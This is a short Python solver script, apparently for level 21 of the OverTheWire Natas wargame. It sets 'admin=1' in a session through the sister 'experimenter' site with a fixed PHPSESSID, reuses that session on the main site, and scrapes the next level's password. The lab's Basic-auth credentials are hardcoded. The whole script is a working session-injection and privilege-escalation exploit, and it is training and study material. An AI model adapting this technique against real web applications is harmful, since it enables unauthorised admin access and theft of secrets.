import re
import requests
from requests.auth import HTTPBasicAuth

def get_pass():
    auth = HTTPBasicAuth('natas21','IFekPyrQXftziDEsUr3x21sYuahypdgJ')
    param = {'debug':'','align':'center','fontsize':'100%','bgcolor':'red','admin':'1', 'submit':'Update'}
    cook = {'PHPSESSID':'tald'}
    requests.get('http://natas21-experimenter.natas.labs.overthewire.org/', auth=auth, params=param, cookies=cook)
    r = requests.get('http://natas21.natas.labs.overthewire.org/', auth=auth, cookies=cook)
    pass_regex = '[a-zA-Z0-9]{32}'
    print(re.findall(pass_regex,r.text)[1])
if __name__ == '__main__':
    get_pass()
